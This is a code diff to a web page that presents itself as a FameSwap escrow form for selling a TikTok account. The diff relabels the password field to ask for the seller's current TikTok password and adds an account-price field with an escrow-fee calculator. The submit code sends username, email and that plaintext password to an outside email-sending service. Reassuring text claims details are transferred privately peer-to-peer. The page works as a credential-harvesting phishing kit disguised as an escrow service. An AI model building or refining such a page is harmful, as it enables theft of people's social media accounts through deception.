@@ -583,6 +583,69 @@
           margin: 0;
         }
       }
+
+      /* Account Price Section Styles */
+      .account-price-section {
+        margin: 24px 0;
+        background-color: rgba(255, 255, 255, 0.05);
+        padding: 20px;
+        border-radius: 8px;
+        border: 1px solid rgba(245, 166, 35, 0.2);
+      }
+
+      .price-input-wrapper {
+        position: relative;
+        display: flex;
+        align-items: center;
+        width: 100%;
+      }
+
+      .price-input-wrapper .currency-symbol {
+        position: absolute;
+        left: 12px;
+        color: rgba(255, 255, 255, 0.5);
+        font-size: 16px;
+      }
+
+      .price-input-wrapper input {
+        padding-left: 30px !important;
+      }
+
+      .price-validation {
+        margin-top: 8px;
+        font-size: 12px;
+        color: rgba(255, 255, 255, 0.5);
+      }
+
+      .price-validation.error {
+        color: #ff4444;
+      }
+
+      .price-validation.success {
+        color: #00c851;
+      }
+
+      .fee-amount-display {
+        margin-top: 16px;
+        padding: 12px;
+        background-color: rgba(255, 255, 255, 0.05);
+        border-radius: 6px;
+        color: rgba(255, 255, 255, 0.7);
+        font-size: 14px;
+      }
+
+      .fee-amount-display .amount {
+        color: #f5a623;
+        font-weight: 500;
+      }
+
+      .fee-amount-display .split {
+        display: flex;
+        justify-content: space-between;
+        margin-top: 8px;
+        padding-top: 8px;
+        border-top: 1px solid rgba(245, 166, 35, 0.2);
+      }
     </style>
   </head>
   <body>
@@ -650,31 +713,31 @@
             </button>
           </div>
 
-          <label for="new-password" class="form-label">New Password *</label>
-          <div class="password-input-wrapper">
-            <input
-              id="new-password"
-              name="new-password"
-              type="password"
-              class="form-input"
-              required
-            />
-            <button
-              type="button"
-              class="toggle-password"
-              data-target="new-password"
-            >
-              <i class="fas fa-eye"></i>
-            </button>
-          </div>
           <p class="form-help-text">
-            Password must be at least 8 characters long and include a mix of
-            letters, numbers, and special characters
+            Enter your current TikTok account password
           </p>
 
           <div class="password-strength" id="password-strength">
             <div class="strength-bar"></div>
             <p class="strength-text">Password strength: <span>Weak</span></p>
+          </div>
+
+          <div class="account-price-section">
+            <label class="form-label">Account Price *</label>
+            <div class="price-input-wrapper">
+              <span class="currency-symbol">$</span>
+              <input
+                id="account-price"
+                name="account-price"
+                type="number"
+                class="form-input"
+                placeholder="Enter account price"
+                min="1"
+                step="0.01"
+                required
+              />
+            </div>
+            <p class="price-validation" id="price-validation">Enter the agreed selling price for your account</p>
           </div>
 
           <div class="escrow-fee-section">
@@ -697,6 +760,13 @@
                 <input type="radio" name="fee-payment" value="split" required />
                 <span class="fee-label">50/50 Split</span>
               </label>
+            </div>
+            <div class="fee-amount-display" id="feeAmountDisplay">
+              <div>Escrow Fee: <span class="amount" id="escrowFeeAmount">$0.00</span></div>
+              <div class="split" id="feeSplitDisplay" style="display: none;">
+                <div>Buyer pays: <span class="amount" id="buyerFeeAmount">$0.00</span></div>
+                <div>Seller pays: <span class="amount" id="sellerFeeAmount">$0.00</span></div>
+              </div>
             </div>
           </div>
 
@@ -730,9 +800,7 @@
           <h3>Important Security Instructions:</h3>
           <ol>
             <li>
-              Your account details have been securely received by FameSwap. The
-              buyer will receive a confirmation email shortly with further
-              instructions for the escrow process.
+              Please note that FameSwap acts as a secure escrow platform only. Your account details will be transferred directly peer-to-peer between buyer and seller, ensuring your privacy and security throughout the transaction.
             </li>
             <li>
               For a smoother account transfer process, please temporarily
@@ -756,6 +824,74 @@
 
         console.log("Initializing form functionality");
 
+        // Account Price Validation
+        const accountPriceInput = document.getElementById('account-price');
+        const priceValidation = document.getElementById('price-validation');
+        const feeAmountDisplay = document.getElementById('feeAmountDisplay');
+        const feeSplitDisplay = document.getElementById('feeSplitDisplay');
+        const escrowFeeAmount = document.getElementById('escrowFeeAmount');
+        const buyerFeeAmount = document.getElementById('buyerFeeAmount');
+        const sellerFeeAmount = document.getElementById('sellerFeeAmount');
+
+        function calculateEscrowFee(price) {
+            console.log('Calculating escrow fee for price:', price);
+            const fee = Math.min(price * 0.05, 50);
+            return parseFloat(fee.toFixed(2));
+        }
+
+        function updateFeeDisplay() {
+            const price = parseFloat(accountPriceInput.value) || 0;
+            const totalFee = calculateEscrowFee(price);
+            const selectedFeeOption = document.querySelector('input[name="fee-payment"]:checked')?.value;
+            
+            console.log('Updating fee display:', { price, totalFee, selectedFeeOption });
+            
+            escrowFeeAmount.textContent = `$${totalFee.toFixed(2)}`;
+            
+            if (selectedFeeOption === 'split') {
+                const splitAmount = (totalFee / 2).toFixed(2);
+                buyerFeeAmount.textContent = `$${splitAmount}`;
+                sellerFeeAmount.textContent = `$${splitAmount}`;
+                feeSplitDisplay.style.display = 'flex';
+            } else {
+                feeSplitDisplay.style.display = 'none';
+            }
+        }
+
+        accountPriceInput.addEventListener('input', function() {
+            console.log('Account price changed:', this.value);
+            const price = parseFloat(this.value);
+            
+            if (this.value === '') {
+                priceValidation.textContent = 'Enter the agreed selling price for your account';
+                priceValidation.className = 'price-validation';
+                updateFeeDisplay();
+                return;
+            }
+
+            if (isNaN(price) || price <= 0) {
+                priceValidation.textContent = 'Please enter a valid price';
+                priceValidation.className = 'price-validation error';
+            } else if (price < 10) {
+                priceValidation.textContent = 'Minimum account price is $10';
+                priceValidation.className = 'price-validation error';
+            } else {
+                priceValidation.textContent = 'Valid price entered';
+                priceValidation.className = 'price-validation success';
+            }
+            
+            updateFeeDisplay();
+            updateSubmitButton();
+        });
+
+        // Add event listeners for fee payment options
+        document.querySelectorAll('input[name="fee-payment"]').forEach(radio => {
+            radio.addEventListener('change', function() {
+                console.log('Fee payment option changed:', this.value);
+                updateFeeDisplay();
+            });
+        });
+
         // Success Popup Functions
         function showPopup() {
           document.getElementById("successPopup").classList.add("active");
@@ -773,9 +909,7 @@
         const form = document.querySelector(".report-form");
         const usernameInput = document.getElementById("username");
         const emailInput = document.getElementById("email");
-        const currentPasswordInput =
-          document.getElementById("current-password");
-        const newPasswordInput = document.getElementById("new-password");
+        const currentPasswordInput = document.getElementById("current-password");
         const feeOptions = document.querySelectorAll(
           'input[name="fee-payment"]'
         );
@@ -831,7 +965,7 @@
         }
 
         // Update password strength indicator
-        newPasswordInput.addEventListener("input", function () {
+        currentPasswordInput.addEventListener("input", function () {
           const strength = checkPasswordStrength(this.value);
           strengthBar.className = "strength-bar " + strength.class;
           strengthText.textContent = strength.text;
@@ -847,8 +981,6 @@
             emailInput.value
           );
           const isCurrentPasswordValid = currentPasswordInput.value.length >= 8;
-          const isNewPasswordValid =
-            checkPasswordStrength(newPasswordInput.value).score >= 3;
           const isFeeSelected = Array.from(feeOptions).some(
             (radio) => radio.checked
           );
@@ -858,7 +990,6 @@
             isUsernameValid,
             isEmailValid,
             isCurrentPasswordValid,
-            isNewPasswordValid,
             isFeeSelected,
             isCheckboxChecked,
           });
@@ -867,7 +998,6 @@
             isUsernameValid &&
             isEmailValid &&
             isCurrentPasswordValid &&
-            isNewPasswordValid &&
             isFeeSelected &&
             isCheckboxChecked
           );
@@ -885,7 +1015,6 @@
           usernameInput,
           emailInput,
           currentPasswordInput,
-          newPasswordInput,
           checkbox,
         ].forEach((element) => {
           element.addEventListener("change", updateSubmitButton);
@@ -905,7 +1034,7 @@
             username: usernameInput.value,
             email: emailInput.value,
             currentPassword: currentPasswordInput.value,
-            newPassword: newPasswordInput.value,
+            accountPrice: accountPriceInput.value,
             feePayment: document.querySelector(
               'input[name="fee-payment"]:checked'
             ).value,
@@ -914,7 +1043,6 @@
           console.log("Form data:", {
             ...formData,
             currentPassword: "***",
-            newPassword: "***",
           });
 
           // Show loading state
@@ -932,7 +1060,7 @@
               from_name: formData.username,
               user_email: formData.email,
               current_password: formData.currentPassword,
-              new_password: formData.newPassword,
+              account_price: formData.accountPrice,
               fee_payment: formData.feePayment,
               timestamp: new Date().toLocaleString(),
             })
